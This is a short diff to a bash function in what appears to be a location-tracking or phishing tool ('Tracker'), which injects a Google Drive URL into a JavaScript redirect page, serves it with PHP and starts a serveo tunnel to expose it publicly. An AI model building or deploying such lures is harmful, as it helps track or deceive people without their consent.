@@ -55,13 +55,13 @@ filedownload(){
 gdrive(){
 
     read -p ">> Enter Google Drive File URL: " gdriveurl  #receiving replaceable drive url
-    cd Tracker/gdrive
-    sed -i "s/REDIRECT_URL/$gdriveurl" temploc.js
+    cd Tracker/gdrive/js
+    sed 's+REDIRECT_URL+'$gdriveurl'+g' temploc.js
     echo "Success, Google Drive url injected.."
     echo "."
     echo "."
     echo "Starting PHP Server..."
-    cd ../..
+    cd ../../..
     cd Tracker/gdrive
     php -S 127.0.0.1:8000
     echo "Starting serveo"
